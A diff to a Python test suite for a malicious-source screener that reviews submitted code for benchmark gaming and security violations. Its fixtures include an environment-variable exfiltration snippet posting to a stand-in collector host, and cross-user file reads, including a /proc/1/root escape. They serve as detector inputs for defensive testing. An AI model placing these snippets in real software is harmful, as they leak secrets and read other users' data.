@@ -24,7 +24,6 @@ from ditto_screener.source_review import (
     OpenRouterSourceReviewAgent,
     TarSourceRepository,
     ledger_disposition,
-    substantiated_concern_count,
 )
 from ditto_screener.source_signals import (
     find_decisive_malicious_source,
@@ -36,6 +35,7 @@ from ditto_screening_protocol import (
     SourceReviewInvariant,
     SourceReviewInvariantDisposition,
 )
+from ditto_screening_protocol.review_ledger import substantiated_concern_count
 
 _SHA = "ab" * 32
 
@@ -47,6 +47,7 @@ _PASS_CLAUSES = {
     "i5_production_engine": "no_family_compiler",
     "i6_tool_execution_fidelity": "no_reported_tool_calls",
     "i7_model_tool_planning": "no_tool_planning",
+    "i8_evaluation_independence": "evaluation_independent_runtime",
 }
 _INVARIANT_FOR_CATEGORY = {
     "benchmark_emulation": "i5_production_engine",
@@ -185,6 +186,7 @@ def test_pass_invariant_evidence_is_dropped_before_strict_validation() -> None:
             {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"}
         ],
         demoted_to_low=False,
+        policy_version=13,
     )
 
     assert all(
@@ -838,9 +840,9 @@ fn run() -> String {
     assert observation.risk_level == "high"
     assert observation.categories == ("benchmark_emulation",)
     assert observation.finding is not None
-    assert observation.finding["prompt_revision"] == (
-        f"source-review-v24-policy-v{SCREENING_POLICY_VERSION}"
-    )
+    assert observation.finding[
+        "prompt_revision"
+    ] == source_review_module._prompt_revision(SCREENING_POLICY_VERSION)
     assert observation.finding["evidence"] == [
         {
             "path": "src/memory_solver.rs",
@@ -1022,6 +1024,100 @@ def test_decisive_preflight_still_flags_targeted_wallet_reads() -> None:
     assert "data_exfiltration" in {item["category"] for item in findings}
 
 
+def test_decisive_preflight_allows_injected_endpoint_and_timeout_config() -> None:
+    """Endpoint and timeout configuration is not cross-user access.
+
+    Reproduces the #2099 hold class (observed on Sky v1) with sanitized,
+    representative configuration: no miner source is reproduced here. Two
+    ordinary shapes combined into a 100%-confidence pre-build quarantine --
+    `/host` inside the `http://host.docker.internal` authority satisfied the
+    filesystem-path role, and a declared `read_timeout` field satisfied the
+    access-effect role on a bare `\\w*` match. Neither is a read of another
+    user's data, and the hold landed before build, runtime-isolation, and tool
+    checks could run.
+    """
+    findings = find_decisive_malicious_source(
+        [
+            (
+                "src/inference/config.rs",
+                "use std::time::Duration;\n"
+                "pub struct InferenceConfig {\n"
+                "    pub base_url: String,\n"
+                "    pub read_timeout: Duration,\n"
+                "    pub write_timeout: Duration,\n"
+                "}\n"
+                "impl InferenceConfig {\n"
+                "    pub fn from_env() -> Self {\n"
+                '        let base_url = std::env::var("DITTO_INFERENCE_BASE_URL")\n'
+                "            .unwrap_or_else(|_| "
+                '"http://host.docker.internal:11434/v1".to_string());\n'
+                "        let read_timeout = Duration::from_secs(600);\n"
+                "        let write_timeout = Duration::from_secs(30);\n"
+                "        Self { base_url, read_timeout, write_timeout }\n"
+                "    }\n"
+                "}\n",
+            ),
+            (
+                "src/runtime.py",
+                "import os\n"
+                'BASE_URL = os.environ.get("DITTO_INFERENCE_BASE_URL",\n'
+                '                          "http://host.docker.internal:8000/v1")\n'
+                "READ_TIMEOUT_SECONDS = 600.0\n"
+                "def client():\n"
+                "    return OpenAiChatClient(base_url=BASE_URL,\n"
+                "                            read_timeout=READ_TIMEOUT_SECONDS)\n",
+            ),
+        ]
+    )
+
+    assert findings == []
+
+
+def test_decisive_preflight_still_flags_a_served_cross_user_read() -> None:
+    """A served read of another principal's files stays decisive.
+
+    The narrowing above removes a URL authority and a config field name; it
+    must not remove the shape the rule exists for. Each fixture reaches a real
+    filesystem location belonging to another user through a real read/walk
+    call, which is the S1 cross-user-access bar.
+    """
+    for path, source in (
+        (
+            "src/served/handler.rs",
+            'let other = request.query("peer_user");\n'
+            'let target = format!("/home/{}/.ditto/memory.json", other);\n'
+            "let borrowed = std::fs::read_to_string(&target)?;\n"
+            "Response::text(borrowed)\n",
+        ),
+        (
+            "src/harvest.rs",
+            'let base = "/Users/";\n'
+            "for entry in walkdir::WalkDir::new(base) {\n"
+            "    collected.push(entry?.path().to_path_buf());\n"
+            "}\n",
+        ),
+        (
+            "src/runtime.py",
+            'TARGET = "file:///home/otheruser/.ditto/memory.db"\n'
+            'blob = open(TARGET.removeprefix("file://"), "rb").read()\n',
+        ),
+        # URL schemes are case-insensitive, so an upper-case file URL names the
+        # same local path and must not be masked as a remote endpoint.
+        (
+            "src/served/upper.py",
+            'TARGET = "FILE:///home/other/.ditto/memory.db"\n'
+            'blob = open(TARGET.removeprefix("FILE://"), "rb").read()\n',
+        ),
+        (
+            "src/escape.rs",
+            'let host_copy = "/proc/1/root/home/other/notes";\n'
+            "let body = std::fs::read(host_copy)?;\n",
+        ),
+    ):
+        findings = find_decisive_malicious_source([(path, source)])
+        assert "cross_user_access" in {item["category"] for item in findings}, path
+
+
 def test_decisive_malicious_preflight_ignores_inert_regression_material() -> None:
     findings = find_decisive_malicious_source(
         [
@@ -1047,6 +1143,143 @@ def test_decisive_malicious_preflight_ignores_inert_regression_material() -> Non
         ]
     )
     assert findings == []
+
+
+@pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
+def test_rust_cfg_test_cross_user_fixture_does_not_hold_preflight(
+    tmp_path: Path, mode: str
+) -> None:
+    source = (
+        "fn main() { serve(); }\n"
+        "fn serve() { call_model(); }\n"
+        "#[cfg(test)]\n"
+        "mod tests {\n"
+        "    fn rejects_foreign_home() {\n"
+        '        let path = "/root/private";\n'
+        "        read(path);\n"
+        "    }\n"
+        "}\n"
+    )
+    repo = TarSourceRepository(
+        str(
+            _archive_files(
+                tmp_path,
+                {
+                    "Dockerfile": (
+                        b"FROM rust:bookworm AS build\nCOPY . .\n"
+                        b"RUN cargo build --release\nFROM scratch\n"
+                        b"COPY --from=build /target/release/app /app\n"
+                        b'ENTRYPOINT ["/app"]\n'
+                    ),
+                    "Cargo.toml": b"[package]\nname='app'\nversion='0.1.0'\n",
+                    "src/main.rs": source.encode(),
+                },
+            )
+        )
+    )
+
+    assert repo.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None
+
+
+def test_rust_cfg_test_does_not_hide_adjacent_served_cross_user_access() -> None:
+    source = (
+        "#[cfg(test)]\n"
+        "mod tests {\n"
+        '    fn local() { let path = "/root/test-fixture"; read(path); }\n'
+        "}\n"
+        'fn serve() { let path = "/root/private"; read(path); }\n'
+    )
+
+    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+
+    assert any(
+        finding["category"] == "cross_user_access"
+        and {item["line"] for item in finding["locations"]} == {5}
+        for finding in findings
+    )
+
+
+def test_rust_test_literal_brace_cannot_hide_following_served_item() -> None:
+    source = (
+        "#[cfg(test)]\n"
+        "mod tests {\n"
+        '    fn local() { let template = "{"; assert!(!template.is_empty()); }\n'
+        "}\n"
+        'fn serve() { let path = "/root/private"; read(path); }\n'
+    )
+
+    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+
+    assert any(
+        finding["category"] == "cross_user_access"
+        and {item["line"] for item in finding["locations"]} == {5}
+        for finding in findings
+    )
+
+
+def test_enforced_preflight_keeps_served_access_after_rust_test_literal(
+    tmp_path: Path,
+) -> None:
+    source = (
+        "#[cfg(test)]\n"
+        "mod tests {\n"
+        '    fn local() { let template = "{"; assert!(!template.is_empty()); }\n'
+        "}\n"
+        'fn serve() { let path = "/root/private"; read(path); }\n'
+        "fn main() { serve(); }\n"
+    )
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM rust:bookworm AS build\nCOPY . .\n"
+                b"RUN cargo build --release\nFROM scratch\n"
+                b"COPY --from=build /target/release/app /app\n"
+                b'ENTRYPOINT ["/app"]\n'
+            ),
+            "Cargo.toml": b"[package]\nname='app'\nversion='0.1.0'\n",
+            "src/main.rs": source.encode(),
+        },
+    )
+
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64, mode="enforce"
+    )
+
+    assert observation is not None
+    assert observation.finding is not None
+    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v2"
+    assert observation.categories == ("cross_user_access",)
+    assert {item["line"] for item in observation.finding["evidence"]} == {5}
+
+
+def test_rust_attribute_text_inside_raw_string_cannot_hide_served_item() -> None:
+    source = (
+        'const GUIDE: &str = r#"\n#[cfg(test)]\nmod tests {\n"#;\n'
+        'fn serve() { let path = "/root/private"; read(path); }\n'
+    )
+
+    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+
+    assert any(
+        finding["category"] == "cross_user_access"
+        and {item["line"] for item in finding["locations"]} == {5}
+        for finding in findings
+    )
+
+
+@pytest.mark.parametrize(
+    "attribute",
+    ["#[cfg(not(test))]", '#[cfg(any(test, feature = "production"))]'],
+)
+def test_rust_cfg_branch_that_can_run_in_production_remains_decisive(
+    attribute: str,
+) -> None:
+    source = f'{attribute}\nfn serve() {{ let path = "/root/private"; read(path); }}\n'
+
+    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+
+    assert any(finding["category"] == "cross_user_access" for finding in findings)
 
 
 def test_decisive_preflight_ignores_nested_inert_regression_material() -> None:
@@ -1701,6 +1934,12 @@ def test_static_preflight_v2_sanitized_regression_corpus(
     assert audit[0]["candidate_revision"] == "static-malicious-preflight-v2"
     expected = case["expected"]
     category = case["category"]
+    if "reachability" in case:
+        assert any(
+            proof["category"] == category
+            and proof["reachability_state"] == case["reachability"]
+            for proof in audit[0]["proofs"]
+        )
     if expected == "decisive":
         assert observation is not None
         assert observation.finding is not None
@@ -1709,6 +1948,11 @@ def test_static_preflight_v2_sanitized_regression_corpus(
         )
         assert category in observation.categories
         assert audit[0]["candidate_decisive"] is True
+    elif expected == "none":
+        assert observation is None
+        assert audit[0]["legacy_decisive"] is False
+        assert audit[0]["candidate_decisive"] is False
+        assert audit[0]["advisory_count"] == 0
     elif audit[0]["legacy_requires_serial_review"]:
         assert observation is not None
         assert observation.finding is not None
@@ -1722,11 +1966,13 @@ def test_static_preflight_v2_sanitized_regression_corpus(
         assert int(audit[0]["advisory_count"]) >= 1
 
 
-def test_static_preflight_off_is_exact_legacy_default(tmp_path: Path) -> None:
+def test_static_preflight_off_retains_legacy_default_for_copied_source(
+    tmp_path: Path,
+) -> None:
     archive = _archive_files(
         tmp_path,
         {
-            "Dockerfile": b"FROM scratch\n",
+            "Dockerfile": b"FROM scratch\nCOPY src/main.rs /src/main.rs\n",
             "src/main.rs": (
                 b'let endpoint = "/var/run/docker.sock";\n'
                 b"connect_control_socket(endpoint);\n"
@@ -1748,7 +1994,7 @@ def test_static_preflight_off_is_exact_legacy_default(tmp_path: Path) -> None:
     )
 
 
-def test_static_preflight_shadow_preserves_legacy_authority_and_records_delta(
+def test_static_preflight_shadow_clears_proven_excluded_helper_and_records_delta(
     tmp_path: Path,
 ) -> None:
     archive = _archive_files(
@@ -1773,19 +2019,122 @@ def test_static_preflight_shadow_preserves_legacy_authority_and_records_delta(
         audit_recorder=audit.append,
     )
 
-    assert observation is not None
-    assert observation.finding is not None
-    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v1"
+    assert observation is None
     assert audit == [
         {
             **audit[0],
             "mode": "shadow",
-            "legacy_decisive": True,
+            "legacy_decisive": False,
             "candidate_decisive": False,
         }
     ]
     assert audit[0]["advisory_count"] == 1
     assert audit[0]["proofs"][0]["reachability_state"] == "proven_inert"
+
+
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_clears_uncopied_rehearsal_after_secret_mount(
+    tmp_path: Path, mode: str
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM rust:bookworm AS builder\nWORKDIR /app\n"
+                b"COPY Cargo.toml ./\n"
+                b"RUN --mount=type=secret,id=build_key cargo build --release\n"
+                b"COPY src ./src\nCOPY fixtures ./fixtures\n"
+                b"RUN --mount=type=secret,id=build_key cargo build --release\n"
+                b"FROM debian:bookworm-slim\n"
+                b"COPY --from=builder /app/target/release/miner /usr/local/bin/miner\n"
+                b"COPY fixtures ./fixtures\n"
+                b'ENTRYPOINT ["miner"]\n'
+            ),
+            "Cargo.toml": b'[package]\nname="miner"\nversion="0.1.0"\n',
+            "src/main.rs": b"fn main() {}\n",
+            "fixtures/model.bin": b"\x00\xff",
+            "scripts/local-rehearsal.py": (
+                b"import os, urllib.request\n"
+                b"with urllib.request.urlopen(\n"
+                b"    'https://example.invalid/public.json'\n"
+                b") as response:\n"
+                b"    dataset = response.read()\n"
+                b"environment = os.environ.copy()\n"
+                b"environment.pop('OPENROUTER_API_KEY', None)\n"
+            ),
+        },
+    )
+    repository = TarSourceRepository(str(archive))
+    assert repository.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None
+
+
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_clears_inference_url_and_read_timeout(
+    tmp_path: Path, mode: str
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app /app/app\n"
+                b'ENTRYPOINT ["python", "/app/app/main.py"]\n'
+            ),
+            "app/main.py": (
+                b"from app.config import Settings\nprint(Settings.from_env())\n"
+            ),
+            "app/config.py": (
+                b"import os\nclass Settings:\n"
+                b"    @classmethod\n    def from_env(cls):\n"
+                b"        inference_url = os.environ.get(\n"
+                b"            'DITTOBENCH_INFERENCE_BASE_URL', 'http://host.docker.internal:11435/v1'\n"
+                b"        )\n"
+                b"        read_seconds = 120\n"
+                b"        return inference_url, read_seconds\n"
+            ),
+        },
+    )
+    assert (
+        TarSourceRepository(str(archive)).malicious_preflight(
+            artifact_sha256="a" * 64, mode=mode
+        )
+        is None
+    )
+
+
+@pytest.mark.parametrize(
+    ("category", "source"),
+    [
+        (
+            "data_exfiltration",
+            b"import os, requests\npayload = os.environ.copy()\n"
+            b"requests.post('https://collector.invalid/report', json=payload)\n",
+        ),
+        (
+            "cross_user_access",
+            b"path = '/home/another-user/private.txt'\n"
+            b"with open(path) as source:\n    print(source.read())\n",
+        ),
+    ],
+)
+@pytest.mark.parametrize("mode", ["off", "enforce"])
+def test_static_preflight_retains_reachable_unsafe_source(
+    tmp_path: Path, mode: str, category: str, source: bytes
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": source,
+        },
+    )
+    observation = TarSourceRepository(str(archive)).malicious_preflight(
+        artifact_sha256="a" * 64, mode=mode
+    )
+    assert observation is not None
+    assert category in observation.categories
 
 
 def test_static_preflight_enforce_routes_unresolved_v1_threat_to_serial_review(
@@ -2075,8 +2424,6 @@ async def test_benign_control_clears_with_zdr_and_read_only_tools(
     )
     assert seen[0]["provider"] == {
         "allow_fallbacks": True,
-        "sort": "throughput",
-        "zdr": True,
         "data_collection": "deny",
         "require_parameters": True,
     }
@@ -2101,10 +2448,10 @@ async def test_benign_control_clears_with_zdr_and_read_only_tools(
     assert observation.finding is not None
     assert "use\nanalyze_binary only when" in prompt
     assert 'compact, precomputed\n"binary_analysis"' in prompt
-    assert observation.finding["prompt_revision"] == (
-        f"source-review-v24-policy-v{SCREENING_POLICY_VERSION}"
-    )
-    assert len(observation.finding["invariant_assessment"]["decisions"]) == 7
+    assert observation.finding[
+        "prompt_revision"
+    ] == source_review_module._prompt_revision(SCREENING_POLICY_VERSION)
+    assert len(observation.finding["invariant_assessment"]["decisions"]) == 8
     initial_inventory = json.loads(
         seen[0]["messages"][1]["content"]
         .split("\nExact-file trusted provenance:\n", 1)[0]
@@ -2136,6 +2483,76 @@ async def test_each_source_review_completion_has_a_short_hard_timeout(
 
     assert attempts == 3
     assert observation.error_code == "source-review-timeouterror"
+
+
+async def test_completion_request_timeout_override_still_obeys_review_deadline(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    attempts = 0
+    blocking_request_started = asyncio.Event()
+    block_request = False
+
+    async def handler(_request: httpx.Request) -> httpx.Response:
+        nonlocal attempts, block_request
+        attempts += 1
+        if block_request:
+            blocking_request_started.set()
+            await asyncio.Event().wait()
+        await asyncio.sleep(0.02)
+        return httpx.Response(
+            200,
+            json={"choices": [{"message": {"role": "assistant", "content": "ok"}}]},
+        )
+
+    monkeypatch.setattr(source_review_module, "_MAX_COMPLETION_REQUEST_SECONDS", 0.005)
+    agent = OpenRouterSourceReviewAgent(
+        api_key_file=None,
+        model="openai/gpt-5.6-luna",
+        base_url="https://openrouter.test/api/v1",
+        timeout_seconds=1,
+        max_steps=1,
+        max_completion_request_seconds=0.5,
+        transport=httpx.MockTransport(handler),
+        transport_retry_delays=(),
+    )
+    async with httpx.AsyncClient(
+        transport=httpx.MockTransport(handler), timeout=1
+    ) as client:
+        message = await agent._completion_message(
+            client,
+            "sk-test-private-review",
+            [{"role": "user", "content": "test"}],
+            timeout=0.5,
+            reasoning_effort="low",
+        )
+        assert message["content"] == "ok"
+
+        block_request = True
+        with pytest.raises(TimeoutError):
+            await agent._completion_message(
+                client,
+                "sk-test-private-review",
+                [{"role": "user", "content": "test"}],
+                timeout=0.01,
+                reasoning_effort="low",
+            )
+    assert blocking_request_started.is_set()
+    assert attempts == 2
+
+
+@pytest.mark.parametrize("value", [0, -1, float("inf"), float("nan"), True])
+def test_completion_request_timeout_override_must_be_finite_positive(value) -> None:
+    with pytest.raises(
+        ValueError, match="max_completion_request_seconds must be finite and positive"
+    ):
+        OpenRouterSourceReviewAgent(
+            api_key_file=None,
+            model="openai/gpt-5.6-luna",
+            base_url="https://openrouter.test/api/v1",
+            timeout_seconds=10,
+            max_steps=1,
+            max_completion_request_seconds=value,
+        )
 
 
 async def test_first_turn_low_result_is_not_a_clearance_certificate(
@@ -2902,12 +3319,11 @@ def test_policy_v10_prompt_teaches_independent_strict_invariants() -> None:
     from ditto_screener.source_review import (
         _prompt_revision,
     )
-    from ditto_screener.source_review import (
-        _source_review_system_prompt as _prompt,
-    )
+    from ditto_screener.source_review import _source_review_system_prompt as _prompt
 
     assert _prompt_revision(11) == "source-review-v24-policy-v11"
     assert _prompt_revision(12) == "source-review-v24-policy-v12"
+    assert _prompt_revision(13) == "source-review-v26-policy-v13"
     required = {
         "I1 MODEL INVOCATION",
         "I2 EVIDENCE RETENTION",
@@ -3019,6 +3435,67 @@ def test_policy_v12_prompt_narrows_plain_normalization_to_slot_rewrite_i4() -> N
         assert "scorer-slot-rescale" not in frozen
 
 
+def test_policy_v13_prompt_adds_mechanism_security_and_i8_rules() -> None:
+    from ditto_screener.source_review import (
+        _POLICY_TAILS,
+        _source_review_tools_for_policy,
+    )
+    from ditto_screener.source_review import (
+        _source_review_system_prompt as _prompt,
+    )
+
+    v12 = _prompt(12)
+    v13 = _prompt(13)
+
+    assert _POLICY_TAILS[13].startswith(_POLICY_TAILS[12])
+    assert "Decide I1 through I8 independently" in v13
+    assert "EVALUATION INDEPENDENCE" in v13
+    assert "always-on benchmark recipe is activated on every served request" in v13
+    assert "unknown, none, or\nn/a" in v13
+    assert "incorrect host removal" in v13
+    assert "Security review covers" in v13
+    assert "`bench_version` from changing substantive retrieval" in v13
+    assert "exact path-and-digest starter-kit provenance" in v13
+    assert "README, metadata sidecar, or duplicate\nself-report" in v13
+    assert "null score or leaderboard field" in v13
+    assert "Decide I1 through I8 independently" not in v12
+
+    legacy = _source_review_tools_for_policy(12, final_turn=True)[0]
+    current = _source_review_tools_for_policy(13, final_turn=True)[0]
+    legacy_invariants = legacy["function"]["parameters"]["properties"]["invariants"]
+    current_invariants = current["function"]["parameters"]["properties"]["invariants"]
+    assert legacy_invariants["minItems"] == legacy_invariants["maxItems"] == 7
+    assert current_invariants["minItems"] == current_invariants["maxItems"] == 8
+    assert legacy_invariants["items"]["properties"]["summary"]["maxLength"] == 240
+    assert current_invariants["items"]["properties"]["summary"]["maxLength"] == 210
+    legacy_categories = legacy["function"]["parameters"]["properties"]["categories"][
+        "items"
+    ]["enum"]
+    current_categories = current["function"]["parameters"]["properties"]["categories"][
+        "items"
+    ]["enum"]
+    assert "mandatory_contract_failure" not in legacy_categories
+    assert "mandatory_contract_failure" in current_categories
+    assert "unauthorized_execution" not in current_categories
+    assert "resource_isolation_violation" not in current_categories
+    assert (
+        "i8_evaluation_independence"
+        not in legacy_invariants["items"]["properties"]["invariant"]["enum"]
+    )
+    assert (
+        "i8_evaluation_independence"
+        in current_invariants["items"]["properties"]["invariant"]["enum"]
+    )
+    legacy_pass_clauses = legacy_invariants["items"]["properties"]["pass_clause"][
+        "anyOf"
+    ][1]["enum"]
+    current_pass_clauses = current_invariants["items"]["properties"]["pass_clause"][
+        "anyOf"
+    ][1]["enum"]
+    assert "evaluation_independent_runtime" not in legacy_pass_clauses
+    assert "evaluation_independent_runtime" in current_pass_clauses
+
+
 def test_source_review_prompt_rejects_unimplemented_policy_version() -> None:
     from ditto_screener.source_review import _source_review_system_prompt
 
@@ -3061,9 +3538,196 @@ def test_written_policy_makes_policy_v10_invariants_implementable() -> None:
         "reply_restates_story_ingredient_money",
         "LINKED_CALCULATION_AUDIT_PROMPT",
         "planned_deck",
+        "declarative-preference-turn-directive",
+        "keep-continuity-capability-rekey",
     }
 
     assert all(fragment in policy for fragment in required)
+
+
+def test_written_policy_v13_covers_new_invariant_and_activation_boundaries() -> None:
+    policy = (
+        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
+    ).read_text()
+    required = {
+        "I8: prohibited evaluation dependence",
+        "`bench_version` or another protocol-version field",
+        "Conditionality is neither necessary nor sufficient",
+        "V1: required submission evidence missing",
+        "V2: platform verification not completed",
+        "V3: provider verification not completed",
+        "Approval and emission eligibility",
+        "Activation prerequisites",
+        "policy-v13-opaque-verification.md",
+        "CLEAR",
+        "REJECT",
+    }
+
+    assert all(fragment in policy for fragment in required)
+
+
+def test_written_policy_v13_accepts_exact_official_component_provenance() -> None:
+    docs = Path(__file__).resolve().parents[1] / "docs"
+    policy = (docs / "policy-v13.md").read_text()
+    opaque = (docs / "policy-v13-opaque-verification.md").read_text()
+
+    policy_required = {
+        "platform-published,\ncontent-addressed provenance record",
+        "exact path and\ndigest match to a named official starter-kit component",
+        "cannot by itself support `V1`",
+        "archive omits a README",
+        "null or omitted field in a score, leaderboard",
+    }
+    opaque_required = {
+        "### Platform-pinned official components",
+        "exact\nmatched bytes at the recorded path",
+        "This equivalence is field- and role-scoped.",
+        "verification-profile digest all match",
+        "artifact-bound screening and challenge records",
+        "V1.required_submission_evidence_missing",
+        "V2.platform_verification_failed",
+    }
+
+    assert not sorted(
+        fragment for fragment in policy_required if fragment not in policy
+    )
+    assert not sorted(
+        fragment for fragment in opaque_required if fragment not in opaque
+    )
+
+
+def test_written_policy_v13_is_strictly_two_outcome() -> None:
+    """v13 resolves every completed review to CLEAR or REJECT.
+
+    A verification failure is a rejection with ``violation_proven: false`` and
+    a named failure domain, never an indefinite hold and never an allegation
+    of cheating.
+    """
+
+    policy = (
+        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
+    ).read_text()
+    required = {
+        "Policy v13 has exactly two final outcomes",
+        "There is no `REVIEW_INCOMPLETE`, `INCONCLUSIVE`, implied clearance",
+        "violation_proven: true | false",
+        "failure_domain: artifact | submission | platform | provider | none",
+        "must never be described as cheating",
+        "A. Proven integrity or security violation",
+        "B. Submission-controlled verification failure",
+        "C. Platform verification failure",
+        "D. Provider verification failure",
+        "V1.required_submission_evidence_missing",
+        "V2.platform_verification_failed",
+        "V3.provider_verification_failed",
+        "Q1.protocol_contract_failure",
+        "## Operator override",
+        "It does not convert `REJECT` to `CLEAR`.",
+        "maximum verification window: 24 hours",
+    }
+
+    missing = sorted(fragment for fragment in required if fragment not in policy)
+    assert not missing, f"policy v13 is missing: {missing}"
+
+
+def test_written_policy_v13_publishes_a_ground_for_every_v13_category() -> None:
+    """A category the reviewer can emit must have a published ground.
+
+    Policy v13 requires every rejection ground to be published before it is
+    enforced. A review category that exists only in the screener would let a
+    finding land with no policy behind it, so each v13-only category is named
+    in the policy text.
+    """
+
+    from ditto_screener.source_review import _POLICY_V13_ONLY_CATEGORIES
+
+    policy = (
+        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
+    ).read_text()
+
+    unpublished = sorted(
+        category for category in _POLICY_V13_ONLY_CATEGORIES if category not in policy
+    )
+
+    assert not unpublished, (
+        f"screener can emit v13 categories with no published ground: {unpublished}"
+    )
+
+
+def test_written_policy_v13_forbids_every_non_decisive_admission() -> None:
+    """No non-decisive screener code may read as a clearance under v13.
+
+    Every code the engine can emit without reaching a decision has to be named
+    in the policy as something that cannot CLEAR.
+    """
+
+    policy = (
+        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
+    ).read_text()
+    non_decisive = {
+        "source-review-inconclusive",
+        "source-review-invalid-risk",
+        "source-review-inconsistent-verdict",
+        "adjudicated-source-review-escalate",
+        "behavioral-oracle-inconclusive",
+        "challenge-inconclusive",
+        "source-review-unavailable",
+    }
+
+    unpublished = sorted(code for code in non_decisive if code not in policy)
+    assert not unpublished, f"policy v13 does not resolve: {unpublished}"
+
+    assert "may produce `CLEAR`, and none of them may submit a passing" in policy
+    assert "v13 protocol guard that rejects\n  `pass_inconclusive`" in policy
+    assert "deadline finalizer" in policy
+
+
+def test_written_policy_v13_covers_the_prompt_security_surface() -> None:
+    """The v13 prompt and the published grounds must not drift apart.
+
+    The prompt tells the reviewer which security surface to cover. Anything it
+    names has to be a published S-condition, otherwise the screener reviews
+    for something it cannot reject on.
+    """
+
+    from ditto_screener.source_review import _POLICY_V13_ADDENDUM
+
+    policy = (
+        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
+    ).read_text()
+    assert "host-resource access" in _POLICY_V13_ADDENDUM
+    assert "additional rejection\ngrounds" in _POLICY_V13_ADDENDUM
+    required = {
+        "### S2: credential or data exfiltration",
+        "host-resource access",
+        "hidden runtime replacement",
+        "S2.credential_or_data_exfiltration",
+    }
+
+    missing = sorted(fragment for fragment in required if fragment not in policy)
+    assert not missing, f"policy v13 is missing: {missing}"
+    assert "S2.unauthorized_execution" not in policy
+    assert "S2.resource_isolation_violation" not in policy
+
+
+def test_written_policy_v13_publishes_the_metamorphic_minimum_profile() -> None:
+    policy = (
+        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
+    ).read_text()
+    required = {
+        "private\nmetamorphic testing is mandatory",
+        "60 paired cases",
+        "three transformation classes",
+        "at least 20 cases per class",
+        "two independent hidden seeds",
+        "material degradation of at least 15 percentage points",
+        "95% confidence lower bound above 5 percentage points",
+        "clean-control degradation no greater than 5 percentage points",
+        "replication in the same direction across both seeds",
+    }
+
+    missing = sorted(fragment for fragment in required if fragment not in policy)
+    assert not missing, f"policy v13 is missing: {missing}"
 
 
 def test_latest_backroom_safe_batch_is_fully_represented() -> None:
@@ -4715,8 +5379,10 @@ def test_review_transcript_compaction_keeps_stable_prefix_and_recent_turns() -> 
     assert sum(row.get("role") == "assistant" for row in compacted) == 3
 
 
+@pytest.mark.parametrize("policy_version", [12, 13])
 async def test_l1_uses_cached_prefix_adaptive_reasoning_and_coverage_exit(
     tmp_path: Path,
+    policy_version: int,
 ) -> None:
     key = tmp_path / "key"
     key.write_text("sk-test-private-review")
@@ -4729,6 +5395,13 @@ async def test_l1_uses_cached_prefix_adaptive_reasoning_and_coverage_exit(
         "evidence": [],
         "summary": "General model-backed request path.",
     }
+    final = _with_policy_v10_invariants(final)
+    if policy_version == 12:
+        final["invariants"] = [
+            item
+            for item in final["invariants"]
+            if item["invariant"] != "i8_evaluation_independence"
+        ]
     areas = [
         "served_entrypoint",
         "retrieval",
@@ -4780,6 +5453,7 @@ async def test_l1_uses_cached_prefix_adaptive_reasoning_and_coverage_exit(
     observation = await _agent(key, httpx.MockTransport(handler)).review(
         str(_archive(tmp_path, "fn main() { call_model(); }")),
         artifact_sha256=_SHA,
+        policy_version=policy_version,
     )
 
     assert observation.ok and observation.risk_level == "low"
@@ -4787,10 +5461,12 @@ async def test_l1_uses_cached_prefix_adaptive_reasoning_and_coverage_exit(
     assert seen[1]["reasoning"] == {"effort": "high"}
     assert seen[0]["prompt_cache_key"] == seen[1]["prompt_cache_key"]
     assert len(str(seen[0]["prompt_cache_key"])) <= 64
-    assert any(
-        "notes ledger now covers every served-path area" in str(row.get("content"))
-        for row in seen[1]["messages"]
+    expected_nudge = (
+        "not a completeness certificate"
+        if policy_version == 13
+        else "notes ledger now covers every served-path area"
     )
+    assert any(expected_nudge in str(row.get("content")) for row in seen[1]["messages"])
     assert "BATCH RELATED READS" in str(seen[0]["messages"][0]["content"])
 
 
